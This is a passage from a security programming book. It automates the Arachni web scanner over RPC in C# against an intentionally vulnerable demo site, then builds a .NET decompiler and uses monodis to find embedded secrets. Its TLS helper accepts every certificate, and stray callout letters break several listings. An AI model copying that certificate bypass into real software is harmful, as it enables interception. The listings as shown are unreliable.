in the output of the listen-\ning RPC server. We’ll need it next. The arachni_rpc script that ships with\nArachni allows you to interface with the RPC listener from the command\nline. After starting the arachni_rpcd listener, open another terminal and\nchange to the Arachni project root directory; then kick off a scan using the\narachni_rpc script, as shown in Listing 12-8.\n$ arachni_rpc --dispatcher-url 127.0.0.1:7331 \\\n\"http://demo.testfire.net/default.aspx\"\nListing 12-8: Running an Arachni scan of the same intentionally vulnerable website via\nthe RPC\nThis command will drive Arachni to use the MSGPACK RPC, just as\nour C# code will do soon. If this is successful, you should see a nice text-\nbased UI updating you on the status of the current scan with a nice report\nat the end, as Listing 12-9 shows.\nArachni - Web Application Security Scanner Framework v2.0dev\nAuthor: Tasos \"Zapotek\" Laskos <tasos.laskos@arachni-scanner.com>\n(With the support of the community and the Arachni Team.)\nWebsite: http://arachni-scanner.com\nDocumentation: http://arachni-scanner.com/wiki\nAutomating Arachni 229\n[~] 10 issues have been detected.\n[+] 1 | Cross-Site Scripting (XSS) in script context at\nhttp://demo.testfire.net/search.aspx in form input `txtSearch` using GET.\n[+] 2 | Cross-Site Scripting (XSS) at http://demo.testfire.net/search.aspx\nin form input `txtSearch` using GET.\n[+] 3 | Common directory at http://demo.testfire.net/PR/ in server.\n[+] 4 | Backup file at http://demo.testfire.net/default.exe in server.\n[+] 5 | Missing 'X-Frame-Options' header at http://demo.testfire.net/default.aspx in server.\n[+] 6 | Common administration interface at http://demo.testfire.net/admin.aspx in server.\n[+] 7 | Common administration interface at http://demo.testfire.net/admin.htm in server.\n[+] 8 | Interesting response at http://demo.testfire.net/default.aspx in server.\n[+] 9 | HttpOnly cookie at http://demo.testfire.net/default.aspx in cookie with inputs\n`amSessionId`.\n[+] 10 | Allowed HTTP methods at http://demo.testfire.net/default.aspx in server.\n[~] Status: Scanning\n[~] Discovered 3 pages thus far.\n[~] Sent 1251 requests.\n[~] Received and analyzed 1248 responses.\n[~] In 00:00:45\n[~] Average: 39.3732270014467 requests/second.\n[~] Currently auditing http://demo.testfire.net/default.aspx\n[~] Burst response time sum 72.511066 seconds\n[~] Burst response count total 97\n[~] Burst average response time 0.747536762886598 seconds\n[~] Burst average 20.086991167522193 requests/second\n[~] Timed-out requests 0\n[~] Original max concurrency 20\n[~] Throttled max concurrency 20\n[~] ('Ctrl+C' aborts the scan and retrieves the report)\nListing 12-9: The arachni_rpc command line scanning UI\nThe ArachniRPCSession Class\nTo run a scan using the RPC framework and C#, we’ll implement the session/\nmanager pattern again, starting with the Arachni RPC session class. With the\nRPC framework, you get a little bit more intimate with the actual Arachni\narchitecture because you need to deal with dispatchers and instances at a\ngranular level. When you connect to the RPC framework for the first time,\nyou are connected to a dispatcher. You can interact with this dispatcher to\ncreate and manage instances, which do the actual scanning and work, but\nthese scanning instances end up dynamically listening on a different port\nthan the dispatcher. In order to provide an easy-to-use interface for both\ndispatchers and instances, we can create a session constructor that allows us\nto gloss over these distinctions a little bit, as shown in Listing 12-10.\n230 Chapter 12\npublic class ArachniRPCSession : IDisposable\n{\nSslStream _stream = null;\npublic ArachniRPCSession(ustring host, int port,\nbool vinitiateInstance = false)\n{\nthis.Host = host;\nthis.Port = port;\nwGetStream(host, port);\nthis.IsInstanceStream = false;\nif (initiateInstance)\n{\nthis.InstanceName = xGuid.NewGuid().ToString();\nMessagePackObjectDictionary resp =\nthis.ExecuteCommand(\"dispatcher.dispatch\"y,\nnew object[] { this.InstanceName }).AsDictionary();\nListing 12-10: The first half of the ArachniRPCSession constructor\nThe constructor accepts three arguments u. The first two—the host to\nconnect to and the port on the host—are required. The third one, which is\noptional v (with a default value of false), allows the programmer to auto-\nmatically create a new scanning instance and connect to it, instead of having\nto create the new instance manually via the dispatcher.\nAfter assigning the Host and Port properties the values of the first two\narguments passed to the constructor, respectively, we connect to the dis-\npatcher using GetStream() w. If a true value is passed in as the third argu-\nment, instantiateInstance (which is false by default), we create a unique\nname for the instance we want to dispatch using a new Guid x and then run\nthe dispatcher.dispatch y RPC command to create a new scanner instance\nthat returns a new port (and potentially new host if you have a cluster of\nscanner instances). Listing 12-11 shows the rest of the constructor.\nstring[] url = uresp[\"url\"].AsString().Split(':');\nthis.InstanceHost = url[0];\nthis.InstancePort = int.Parse(url[1]);\nthis.Token = vresp[\"token\"].AsString();\nwGetStream(this.InstanceHost, this.InstancePort);\nbool aliveResp = this.xExecuteCommand(\"service.alive?\", new object[] { },\nthis.Token).AsBoolean();\nthis.IsInstanceStream = aliveResp;\n}\n}\nypublic string Host { get; set; }\npublic int Port { get; set; }\npublic string Token { get; set; }\nAutomating Arachni 231\npublic bool IsInstanceStream { get; set; }\npublic string InstanceHost { get; set; }\npublic int InstancePort { get; set; }\npublic string InstanceName { get; set; }\nListing 12-11: The second half of the ArachniRPCSession constructor and its properties\nAt u, we split the scanner instance URL (for example, 127.0.0.1:7331)\ninto the IP address and the port (127.0.01 and 7331, respectively). Once\nwe have the instance host and port we will use to drive the actual scan, we\nassign the values to our InstanceHost and InstancePort properties, respec-\ntively. We also save the authentication token v returned by the dispatcher\nso we can make authenticated RPC calls later on the scanner instance. This\nauthentication token is automatically generated by the Arachni RPC when\nwe dispatch a new instance so that only we can use the new scanner with the\ntoken.\nWe connect to the scanner instance using GetStream() w, which provides\ndirect access to the scanning instance. If the connection is successful and\nthe scanning instance is alive x, we assign the IsInstanceStream property\nto true so that we know whether we are driving a dispatcher or a scanning\ninstance (which determines the RPC calls we can make to Arachni, such\nas creating a scanner or performing a scan) later when we implement the\nArachniRPCManager class. After the constructor, we define the properties y for\nthe session class, all of which are used in the constructor.\nThe Supporting Methods for ExecuteCommand()\nBefore we implement ExecuteCommand(), we need to implement the support-\ning methods for ExecuteCommand(). We’re almost there! Listing 12-12 shows\nthe methods we need in order to finish up the ArachniRPCSession class.\npublic byte[] DecompressData(byte[] inData)\n{\nusing (MemoryStream outMemoryStream = new MemoryStream())\n{\nusing (uZOutputStream outZStream = new ZOutputStream(outMemoryStream))\n{\noutZStream.Write(inData, 0, inData.Length);\nreturn outMemoryStream.ToArray();\n}\n}\n}\nprivate byte[] vReadMessage(SslStream sslStream)\n{\nbyte[] sizeBytes = new byte[4];\nsslStream.Read(sizeBytes, 0, sizeBytes.Length);\nif (BitConverter.IsLittleEndian)\nArray.Reverse(sizeBytes);\nuint size = BitConverter.wToUInt32(sizeBytes, 0);\n232 Chapter 12\nbyte[] buffer = new byte[size];\nsslStream.Read(buffer, 0, buffer.Length);\nreturn buffer;\n}\nprivate void xGetStream(string host, int port)\n{\nTcpClient client = new TcpClient(host, port);\n_stream = new SslStream(client.GetStream(), false,\nnew RemoteCertificateValidationCallback(yValidateServerCertificate),\n(sender, targetHost, localCertificates,\nremoteCertificate, acceptableIssuers)\n=> null);\n_stream.AuthenticateAsClient(\"arachni\", null, SslProtocols.Tls, false);\n}\nprivate bool ValidateServerCertificate(object sender, X509Certificate certificate,\nX509Chain chain, SslPolicyErrors sslPolicyErrors)\n{\nreturn true;\n}\npublic void zDispose()\n{\nif (this.IsInstanceStream && _stream != null)\nthis.ExecuteCommand({\"service.shutdown\", new object[] { }, this.Token);\nif (_stream != null)\n_stream.Dispose();\n_stream = null;\n}\nListing 12-12: The supporting methods for the ArachniRPCSession class\nMost of the support methods for the RPC session class are relatively\nsimple. The DecompressData() method creates a new output stream from\nthe zlib library available in NuGet, called ZOutputStream u. This returns the\ndecompressed data as a byte array. In the ReadMessage() method v, we read\nthe first 4 bytes from the stream and then convert the bytes into a 32-bit\nunsigned integer w that represents the length of the rest of the data. Once\nwe have the length, we read the rest of the data from the stream and return\nthe data as a byte array.\nThe GetStream() method x is also very similar to the code we used to\ncreate a network stream in the OpenVAS library. We create a new TcpClient\nand wrap the stream in an SslStream. We use the ValidateServerCertificate()\nmethod y to trust all SSL certificates by returning true all the time. This\nallows us to connect to the RPC instances with self-signed certificates.\nAutomating Arachni 233\nFinally, Dispose() z is required by the IDisposable interface that the\nArachniRPCSession class implements. If we’re driving a scanning instance\ninstead of a dispatcher (set in the constructor when the ArachniRPCSession\nwas created), we send the instance a shutdown command { to clean up the\nscanning instance but leave the dispatcher running.\nThe ExecuteCommand() Method\nThe ExecuteCommand() method shown in Listing 12-13 wraps all the functional-\nity required to send commands and receive responses from the Arachni RPC.\npublic MessagePackObject uExecuteCommand(string command, object[] args,\nstring token = null)\n{\nvDictionary<string, object> = new Dictionary<string, object>();\nwmessage[\"message\"] = command;\nmessage[\"args\"] = args;\nif (token != null)\nxmessage[\"token\"] = token;\nbyte[] packed;\nusing (MemoryStream stream = new yMemoryStream())\n{\nPacker packer = Packer.Create(stream);\npacker.PackMap(message);\npacked = stream.ToArray();\n}\nListing 12-13: The first half of the ExecuteCommand() method in the ArachniRPCSession class\nThe ExecuteCommand() method u accepts three arguments: the com-\nmand to execute, an object of the arguments to use with the command, and\nan optional argument for a token if an authentication token was provided.\nThe method will mostly be used by the ArachniRPCManager class later. We\nstart the method by creating a new dictionary called request to hold our\ncommand data (the command to run and the arguments for the RPC\ncommand) v. We then assign the message key w in the dictionary the first\nargument passed to the ExecuteCommand() method, which is the command\nto run. We also assign the args key in the dictionary with the second argu-\nment passed to the method, which are the options for the command to be\nrun. Arachni will look at these keys when we send our message, run the RPC\ncommand with the given arguments, and then return a response. If the\nthird argument, which is optional, is not null, we assign the token key x\nthe authentication token passed to the method. These three dictionary\nkeys (message, args, and token) are all that Arachni will look at when you\nsend the serialized data to it.\nOnce we have set up the request dictionary with the information we want\nto send to Arachni, we create a new MemoryStream() y and use the same Packer\nclass from the Metasploit bindings in Chapter 11 to serialize the request\n234 Chapter 12\ndictionary into a byte array. Now that we have prepared the data to send\nto Arachni to run an RPC command, we need to send the data and read\nthe response from Arachni. That takes place in the second half of the\nExecuteCommand() method, shown in Listing 12-14.\nbyte[] packedLength = uBitConverter.GetBytes(packed.Length);\nif (BitConverter.IsLittleEndian)\nArray.Reverse(packedLength);\nv_stream.Write(packedLength);\nw_stream.Write(packed);\nbyte[] respBytes = xReadMessage(_stream);\nMessagePackObjectDictionary resp = null;\ntry\n{\nresp = Unpacking.UnpackObject(respBytes).Value.AsDictionary();\n}\nycatch\n{\nbyte[] decompressed = DecompressData(respBytes);\nresp = Unpacking.UnpackObject(decompressed).Value.AsDictionary();\n}\nreturn resp.ContainsKey(\"obj\") ? resp[\"obj\"] : resp[\"exception\"];\n}\nListing 12-14: The second half of the ExecuteCommand() method in the ArachniRPCSession class\nSince the Arachni RPC stream uses a simple protocol to communicate,\nwe can easily send our MSGPACK data to Arachni, but we need to send\nArachni two pieces of information, not just the MSGPACK data. We first need\nto send Arachni the size of the MSGPACK data as a 4-byte integer in front of\nthe MSGPACK data. This integer is the length of the serialized data in each\nmessage and tells the receiving host (in this case, Arachni) how much of\nthe stream needs to be read in as part of the message segment. We need to\nget the bytes for the length of the data, so we use BitConverter.GetBytes() u\nto get the 4-byte array. The length of the data and the data itself need to be\nwritten to the Arachni stream in a certain order. We first write the 4 bytes\nrepresenting the data’s length to the stream v and then write the full seri-\nalized message to the stream w.\nNext, we need to read the response from Arachni and return the\nresponse to the caller. Using the ReadMessage() method x, we take the raw\nbytes of the message from the response and attempt to unpack them into a\nMessagePackObjectDictionary in a try/catch block. If the first attempt is unsuc-\ncessful, that means the data is compressed using Gzip, so the catch block y\ntakes over. We decompress the data and then unpack the decompressed\nbytes into a MessagePackObjectDictionary. Finally, we return either the full\nresponse from the server or an exception if an error has occurred.\nAutomating Arachni 235\nThe ArachniRPCManager Class\nThe ArachniRPCManager class is considerably simpler than the ArachniRPCSession\nclass, as shown in Listing 12-15.\npublic class ArachniRPCManager : IDisposable\n{\nArachniRPCSession _session;\npublic ArachniRPCManager(uArachniRPCSession session)\n{\nif (!session.IsInstanceStream)\nthrow new Exception(\"Session must be using an instance stream\");\n_session = session;\n}\npublic MessagePackObject vStartScan(string url, string checks = \"*\")\n{\nDictionary<string, object>args = new Dictionary<string, object>();\nargs[\"url\"] = url;\nargs[\"checks\"] = checks;\nargs[\"audit\"] = new Dictionary<string, object>();\n((Dictionary<string, object>)args[\"audit\"])[\"elements\"] = new object[] { \"links\", \"forms\" };\nreturn _session.ExecuteCommand(w\"service.scan\", new object[] { args }, _session.Token);\n}\npublic MessagePackObject xGetProgress(List<uint> digests = null)\n{\nDictionary<string, object>args = new Dictionary<string, object>();\nargs[\"with\"] = \"issues\";\nif (digests != null)\n{\nargs[\"without\"] = new Dictionary<string, object>();\n((Dictionary<string, object>)args[\"without\"])[\"issues\"] = digests.ToArray();\n}\nreturn _session.yExecuteCommand(\"service.progress\", new object[] { args }, _session.Token);\n}\npublic MessagePackObject zIsBusy()\n{\nreturn _session.ExecuteCommand(\"service.busy?\", new object[] { }, _session.Token);\n}\npublic void Dispose()\n{\n{_session.Dispose();\n}\n}\nListing 12-15: The ArachniRPCManager class\nFirst, the ArachniRPCManager constructor accepts an ArachniRPCSession u\nas its only argument. Our manager class will only implement methods for a\n236 Chapter 12\nscanning instance, not a dispatcher, so if the session passed in is not a scan-\nning instance, we throw an exception. Otherwise, we assign the session to a\nlocal class variable for use in the rest of the methods.\nThe first method we create in the ArachniRPCManager class is the\nStartScan() method v, which accepts two arguments. The first argument,\nwhich is required, is a string of the URL Arachni will scan. The second\nargument, which is optional, defaults to running all checks (such as XSS,\nSQL injection, and path traversal, for example), but it can be changed if the\nuser wants to specify different checks in the options passed to StartScan().\nTo determine which checks are run, we build a new message to send to\nArachni by instantiating a new dictionary using the url and checks argu-\nments passed to the StartScan() method and audit, which Arachni will look\nat to determine what kind of scan to perform when we send the message.\nFinally, we send the message using the service.scan command w and return\nthe response to the caller.\nThe GetProgress() method x accepts a single optional argument: a list\nof integers that Arachni uses to identify reported issues. We’ll talk more\nabout how Arachni reports issues in the next section. Using this argument,\nwe build a small dictionary and pass it to the service.progress command y,\nwhich will return the current progress and status of the scan. We send the\ncommand to Arachni and then return the result to the caller.\nThe last important method, IsBusy() z, simply tells us whether the\ncurrent scanner is performing a scan. Finally, we clean it all up with\nDispose() {.\nPutting it all together\nNow we have the building blocks to drive Arachni’s RPC to scan a URL and\nreport the results in real time. Listing 12-16 shows how we glue all the parts\ntogether to scan a URL with the RPC.\npublic static void Main(string[] args)\n{\nusing (ArachniRPCSession session = new uArachniRPCSession(\"127.0.0.1\",\n7331, true))\n{\nusing (ArachniRPCManager manager = new ArachniRPCManager(session))\n{\nConsole.vWriteLine(\"Using instance: \" + session.InstanceName);\nmanager.StartScan(\"http://demo.testfire.net/default.aspx\");\nbool isRunning = manager.IsBusy().AsBoolean();\nList<uint> issues = new List<uint>();\nDateTime start = DateTime.Now;\nConsole.WriteLine(\"Starting scan at \" + start.ToLongTimeString());\nwwhile (isRunning)\n{\nThread.Sleep(10000);\nvar progress = manager.GetProgress(issues);\nforeach (MessagePackObject p in\nprogress.AsDictionary()[\"issues\"].AsEnumerable())\nAutomating Arachni 237\n{\nMessagePackObjectDictionary dict = p.AsDictionary();\nConsole.xWriteLine(\"Issue found: \" + dict[\"name\"].AsString());\nissues.Add(dict[\"digest\"].AsUInt32());\n}\nisRunning = manager.yIsBusy().AsBoolean();\n}\nDateTime end = DateTime.Now;\nzConsole.WriteLine(\"Finishing scan at \" + end.ToLongTimeString() +\n\". Scan took \" + ((end - start).ToString()) + \".\");\n}\n}\n}\nListing 12-16: Driving Arachni with the RPC classes\nWe start the Main() method by creating a new ArachniRPCSession u, pass-\ning the host and port for the Arachni dispatcher, as well as true as the third\nargument to automatically get a new scanning instance. Once we have the\nsession and manager classes and are connected to Arachni, we print our\ncurrent instance name v, which should just be the unique ID we generated\nwhen we created the scanning instance to connect to it. We then start the\nscan by passing the test URL to the StartScan() method.\nOnce the scan is started, we can watch it until it’s finished and then\nprint the final report. After creating a few variables such as an empty\nlist, which we’ll use to store the issues that Arachni reports back, and the\ntime when the scan started, we begin a while loop w, which will loop until\nisRunning is false. Within the while loop, we call GetProgress() to get the cur-\nrent progress of our scan; then we print x and store any new issues found\nsince we last called GetProgress(). We finally sleep for 10 seconds and then\ncall IsBusy() y again. We then start the process all over again until the scan\nis finished. When all is said and done, we print a small summary z of how\nlong the scan took. If you look at the vulnerabilities reported by your auto-\nmation (my truncated results are shown in Listing 12-17) and the original\nArachni scans we performed by hand at the beginning of the chapter, they\nshould match up!\n$ mono ./ch12_automating_arachni.exe\nUsing instance: 1892413b-7656-4491-b6c0-05872396b42f\nStarting scan at 8:58:12 AM\nIssue found: Cross-Site Scripting (XSS)u\nIssue found: Common directory\nIssue found: Backup filev\nIssue found: Missing 'X-Frame-Options' header\nIssue found: Interesting response\nIssue found: Allowed HTTP methods\nIssue found: Interesting response\nIssue found: Path Traversalw\n--snip--\nListing 12-17: Running the Arachni C# classes to scan and report on a sample URL\n238 Chapter 12\nBecause we are running Arachni with all the checks enabled, this site\nwill report a lot of vulnerabilities! In just the first 10 or so lines, Arachni\nreported an XSS vulnerability u, a backup file with potentially sensitive\ninformation v, and a path traversal weakness w. If you wanted to limit the\nchecks Arachni performs to just an XSS vulnerability scan, you could pass a\nsecond argument to StartScan with the string xss* (the default value for the\nargument is *, which means “all checks”), and Arachni would only check\nfor and report any XSS vulnerabilities found. The command would end up\nlooking like the following line of code:\nmanager.StartScan(\"http://demo.testfire.net/default.aspx\", \"xss*\");\nArachni supports a wide variety of checks, including SQL and com-\nmand injection, so I encourage you to read the documentation on the sup-\nported checks.\nConclusion\nArachni is an incredibly powerful and versatile web application scanner\nthat should be a tool in any serious security engineer or pentester’s arsenal.\nAs you have seen in this chapter, you can easily drive it in both simple and\ncomplex scenarios. If you only need to scan a single application regularly,\nthe HTTP API might be enough for you. However, if you find yourself con-\nstantly scanning new and different applications, the ability to spin up scan-\nners at will may be the best way for you to distribute your scans and prevent\nbottlenecking.\nWe first implemented a set of simple classes that interfaced with the\nArachni REST API in order to kick off, watch, and report on a scan. Using\nthe base HTTP libraries in our toolset, we were able to easily build modular\nclasses to drive Arachni.\nOnce we finished the simpler REST API, we took Arachni a step further to\ndrive it via the MSGPACK RPC. Using a couple of open source third-party\nlibraries, we were able to drive Arachni with some of its more powerful fea-\ntures. We used its distributed model to create a new scanning instance with\nthe RPC dispatcher, and then we scanned a URL and reported the results\nin real time.\nUsing either of these building blocks, you can incorporate Arachni into\nany SDLC or continuous integration system to ensure the quality and secu-\nrity of the web applications being used or built by you or your organization.\nAutomating Arachni 239\n13\nDeCoM PilinG anD re VerSinG\nManaGeD aSSeMBlieS\nMono and .NET use a VM much as Java\ndoes to run compiled exe cutables. The exe-\ncutable format for .NET and Mono is written\nusing a higher-level bytecode than native x86\nor x86_64 assembly, called managed assembly. This\nis in contrast to the native, unmanaged executables\nfrom languages like C and C++. Because managed assemblies are written\nin a higher-level bytecode, decompiling them is fairly straightforward if you\nuse a few libraries that are not a part of the standard library.\nIn this chapter, we will write a short decompiler that accepts a managed\nassembly and writes the source code back to a specified folder. This is a very\nuseful tool for malware researchers, reverse engineers, or anyone needing\nto perform binary diffing (comparing two compiled binaries or libraries for\ndifferences at the byte level) between two .NET libraries or applications.\nWe will then briefly cover a program shipped with Mono called monodis that\nis very useful for analyzing assemblies outside of source code analysis for\npotential backdoors and other nefarious code.\ndecompiling Managed assemblies\nA number of easy-to-use .NET decompilers exist. However, their UIs tend to\nuse toolkits like WPF (Windows Presentation Foundation) that keep them\nfrom being cross-platform (and mainly only running on Windows). Many\nsecurity engineers, analysts, and pentesters run Linux or OS X, so this isn’t\nsuper useful. ILSpy is one example of a good Windows decompiler; it uses\nthe cross-platform ICSharpCode.Decompiler and Mono.Cecil libraries for decom-\npilation, but its UI is Windows specific, so it isn’t usable on Linux or OS X.\nLuckily, we can build a simple tool that takes an assembly as an argument\nand uses these two previously mentioned open source libraries to decom-\npile a given assembly and write the resulting source code back to disk for\nlater analysis.\nBoth of these libraries are available in NuGet. Installation will depend\non your IDE; if you are using Xamarin Studio or Visual Studio, you can\nmanage NuGet packages in the Solution Explorer for each project in the\nsolution. Listing 13-1 details the whole class, with the methods required to\ndecompile a given assembly.\nclass MainClass\n{\npublic static void uMain(string[] args)\n{\nif (args.Length != 2)\n{\nConsole.Error.WriteLine(\"Dirty C# decompiler requires two arguments.\");\nConsole.Error.WriteLine(\"decompiler.exe <assembly> <path to directory>\");\nreturn;\n}\nIEnumerable<AssemblyClass> klasses = vGenerateAssemblyMethodSource(args[0]);\nwforeach (AssemblyClass klass in klasses)\n{\nstring outdir = Path.Combine(args[1], klass.namespase);\nif (!Directory.Exists(outdir))\nDirectory.CreateDirectory(outdir);\nstring path = Path.Combine(outdir, klass.name + \".cs\");\nFile.WriteAllText(path, klass.source);\n}\n}\nprivate static IEnumerable<AssemblyClass> xGenerateAssemblyMethodSource(string assemblyPath)\n{\nAssemblyDefinition assemblyDefinition = AssemblyDefinition.yReadAssembly(assemblyPath,\nnew ReaderParameters(ReadingMode.Deferred) { ReadSymbols = true });\nAstBuilder astBuilder = null;\nforeach (var defmod in assemblyDefinition.Modules)\n{\nzforeach (var typeInAssembly in defmod.Types)\n{\nAssemblyClass klass = new AssemblyClass();\n242 Chapter 13\nklass.name = typeInAssembly.Name;\nklass.namespase = typeInAssembly.Namespace;\nastBuilder = new AstBuilder(new DecompilerContext(assemblyDefinition.MainModule)\n{ CurrentType = typeInAssembly });\nastBuilder.AddType(typeInAssembly);\nusing (StringWriter output = new StringWriter())\n{\nastBuilder.{GenerateCode(new PlainTextOutput(output));\nklass.|source = output.ToString();\n}\n}yield return klass;\n}\n}\n}\n}\npublic class AssemblyClass\n{\npublic string namespase;\npublic string name;\npublic string source;\n}\nListing 13-1: The dirty C# decompiler\nListing 13-1 is pretty dense, so let’s go through the big points. In the\nMainClass, we first create a Main() method u that will be run when we run\nthe program. It begins by checking how many arguments are specified. If\nonly one argument is specified, it prints the usage and exits. If two argu-\nments are specified in the application, we assume that the first is the path\nto the assembly we want to decompile and that the second is the folder\nwhere the resulting source code should be written. Finally, we pass the\nfirst argument to the application using the GenerateAssemblyMethodSource()\nmethod v, which is implemented just below the Main() method.\nIn the GenerateAssemblyMethodSource() method x, we use the Mono.Cecil\nmethod ReadAssembly() y to return an AssemblyDefinition. Basically, this is a\nclass from Mono.Cecil that fully represents an assembly and allows you to pro-\ngrammatically probe it. Once we have the AssemblyDefinition for the assem-\nbly we want to decompile, we have what we need to generate C# source code\nthat is functionally equivalent to the raw bytecode instructions in the assem-\nbly. We use Mono.Cecil to generate our C# code from the AssemblyDefinition\nby creating an abstract syntax tree (AST). I won’t go into ASTs (there are college\ncourses dedicated to this subject), but you should know that an AST can\nexpress every potential code path within a program and that Mono.Cecil can\nbe used to generate the AST of a .NET program.\nThis process must be repeated for every class in the assembly. Basic\nassemblies like this one have only one or two classes, but complex applica-\ntions can have many dozen or more. That would be a pain to code individu-\nally, so we create a foreach loop z to do the work for us. It iterates these\nDecompiling and Reversing Managed Assemblies 243\nsteps over each class in the assembly and creates a new AssemblyClass (which\nis defined below the GenerateAssemblyMethodSource() method) based on the\ncurrent class information.\nThe part to note here is that the GenerateCode() method { actually does\nthe heavy lifting of the whole program by taking the AST we create to give\nus a C# source code representation of the class in the assembly. Then, we\nassign the source field | on the AssemblyClass with the generated C# source\ncode, as well as the name of the class and the namespace. When all this is\ndone, we return a list of classes and their source code to the caller of the\nGenerateAssemblyMethodSource() method—in this case, our Main() method. As\nwe iterate over each class returned w by GenerateAssemblyMethodSource(), we\ncreate a new file per class and write the source code for the class into the\nfile. We use the yield keyword } in GenerateAssemblyMethodSource() to return\neach class, one at a time, as we iterate in the foreach loop w rather than\nreturning a full list of all the classes and then processing them. This is a\ngood performance boost for binaries with a lot of classes to process.\ntesting the decompiler\nLet’s take a time-out to test this by writing a Hello World–esque application.\nMake a new project with the simple class in Listing 13-2 and then compile it.\nusing System;\nnamespace hello_world\n{\nclass MainClass\n{\npublic static void Main(string[] args)\n{\nConsole.WriteLine(\"Hello World!\");\nConsole.WriteLine(2 + 2);\n}\n}\n}\nListing 13-2: A simple Hello World application before decompilation\nAfter compiling the project, we point our new decompiler at it to see\nwhat it comes out with, as shown in Listing 13-3.\n$ ./decompiler.exe ~/projects/hello_world/bin/Debug/hello_world.exe hello_world\n$ cat hello_world/hello_world/MainClass.cs\nusing System;\nnamespace hello_world\n{\ninternal class MainClass\n{\npublic static void Main(string[] args)\n{\nConsole.WriteLine(\"Hello World!\");\n244 Chapter 13\nConsole.WriteLine(u4);\n}\n}\n}\nListing 13-3: The decompiled Hello World source code\nPretty close! The only real difference is the second WriteLine() method\ncall. In the original code, we had 2 + 2, but the decompiled version outputs\n4 u. This is not a problem. During compile time, anything that evaluates to\na constant value is replaced with that in the binary, so 2 + 2 gets written as 4\nin the assembly—something to keep in mind when dealing with assemblies\nthat perform a lot of math to achieve a given result.\nusing monodis to analyze an assembly\nSay we want to do some cursory investigation into a malicious binary before\ndecompiling it. The monodis tool that ships with Mono gives us a lot of power\nfor doing this. It has specific strings-type options (strings is a common Unix\nutility that prints any human-readable string of characters found in a given\nfile) and can list and export resources compiled into the assembly such as\nconfig files or private keys. The monodis usage output can be cryptic and hard\nto read, as shown in Listing 13-4 (though the man page is a little better).\n$ monodis\nmonodis -- Mono Common Intermediate Language Disassembler\nUsage is: monodis [--output=filename] [--filter=filename] [--help] [--mscorlib]\n[--assembly] [--assemblyref] [--classlayout]\n[--constant] [--customattr] [--declsec] [--event] [--exported]\n[--fields] [--file] [--genericpar] [--interface] [--manifest]\n[--marshal] [--memberref] [--method] [--methodimpl] [--methodsem]\n[--methodspec] [--moduleref] [--module] [--mresources] [--presources]\n[--nested] [--param] [--parconst] [--property] [--propertymap]\n[--typedef] [--typeref] [--typespec] [--implmap] [--fieldrva]\n[--standalonesig] [--methodptr] [--fieldptr] [--paramptr] [--eventptr]\n[--propertyptr] [--blob] [--strings] [--userstrings] [--forward-decls] file ..\nListing 13-4: The monodis usage output\nRunning monodis with no arguments prints a full disassembly of the\nassembly in the Common Intermediate Language (CIL) bytecode, or you\ncan output the disassembly straight into a file. Listing 13-5 shows some of\nthe disassembly output of the ICSharpCode.Decompiler.dll assembly, which\nis effectively analogous to the x86 assembly language you may see for a\nnatively compiled application.\n$ monodis ICSharpCode.Decompiler.dll | tail -n30 | head -n10\nIL_000c: mul\nIL_000d: call class [mscorlib]System.Collections.Generic.EqualityComparer`1<!0> class\n[mscorlib]System.Collections.Generic.EqualityComparer`1<!'<expr>j__TPar'>::get_Default()\nIL_0012: ldarg.0\nDecompiling and Reversing Managed Assemblies 245\nIL_0013: ldfld !0 class '<>f__AnonymousType5`2'<!0,!1>::'<expr>i__Field'\nIL_0018: callvirt instance int32 class [mscorlib]System.Collections.Generic.Equality\nComparer`1<!'<expr>j__TPar'>::GetHashCode(!0)\nIL_001d: add\nIL_001e: stloc.0\nIL_001f: ldc.i4 -1521134295\nIL_0024: ldloc.0\nIL_0025: mul\n$\nListing 13-5: Some CIL disassembly from ICSharpCode.Decompiler.dll\nThat’s nice, but not very useful if you don’t know what you’re looking at.\nNotice that the output code looks similar to x86 assembly. This is actually\nraw intermediate language (IL), which is kind of like Java bytecode in JAR\nfiles, and it can seem a bit arcane. You’ll likely find this most useful when\ndiffing two versions of a library to see what was changed.\nIt has other great features that aid in reverse engineering. For instance,\nyou can run the GNU strings utility on an assembly to see which strings are\nstored inside, but you always get cruft you don’t want, such as random byte\nsequences that just happen to be ASCII printable. If, on the other hand,\nyou pass the --userstrings argument to monodis, it will print any strings that\nare stored for use in the code, such as variable assignments or constants, as\nListing 13-6 shows. Since monodis actually parses the assembly to determine\nwhat strings have been programmatically defined, it can produce much\ncleaner results with higher signal to noise.\n$ monodis --userstrings ~/projects/hello_world/bin/Debug/hello_world.exe\nUser Strings heap contents\n00: \"\"\n01: \"Hello World!\"\n1b: \"\"\n$\nListing 13-6: Using the --userstrings argument for monodis\nYou can also combine --userstrings with --strings (used for metadata\nand other things), which will output all strings stored in the assembly that\naren’t the random garbage that GNU strings picks up. This is very useful\nwhen you look for encryption keys or credentials hardcoded into assemblies.\nHowever, my favorite monodis flags are --manifest and --mresources. The\nfirst, --manifest, lists all the embedded resources in the assembly. These are\nusually images or configuration files, but sometimes you’ll find private keys\nand other sensitive material. The second argument, --mresources, saves each\nembedded resource to the current working directory. Listing 13-7 shows\nthis in practice.\n$ monodis --manifest ~/projects/hello_world/bin/Debug/hello_world.exe\nManifestresource Table (1..1)\n1: public 'hello_world.til_neo.png' at offset 0 in current module\n$ monodis --mresources ~/projects/hello_world/bin/Debug/hello_world.exe\n$ file hello_world.til_neo.png\n246 Chapter 13\nhello_world.til_neo.png: PNG image data, 1440 x 948, 8-bit/color RGBA, non-interlaced\n$\nListing 13-7: Saving an embedded resource to the filesystem with monodis\nApparently, someone hid a picture of Neo in my Hello World appli-\ncation! To be sure, monodis is a favorite tool when I’m messing with an\nunknown assembly and I want to gain a little bit more information about it,\nsuch as methods or specific strings in the binary.\nFinally, we have one of the most useful arguments to monodis, --method,\nwhich lists all the methods and arguments available in a library or binary\n(see Listing 13-8).\n$ monodis --method ch1_hello_world.exe\nMethod Table (1..2)\n########## ch1_hello_world.MainClass\n1: uinstance default void '.ctor' () (param: 1 impl_flags: cil managed )\n2: vdefault void Main (string[] args) (param: 1 impl_flags: cil managed )\nListing 13-8: Demonstrating the --method argument for monodis\nWhen you run monodis --method on the Hello World program from\nChapter 1, you will notice that monodis prints two method lines. The first\nline u is the constructor for the MainClass class that contains the Main()\nmethod, on line 2 v. So, not only does this argument list all the methods\n(and which class those methods are in), but it also prints the class construc-\ntors! This can offer great insight into how a program may work: method\nnames are often good descriptions of what is going on internally.\nConclusion\nIn the first part of this chapter, we discussed how to utilize the open source\nICSharpCode.Decompiler and Mono.Cecil libraries to decompile an arbitrary\nassembly back into C# code. By compiling a small 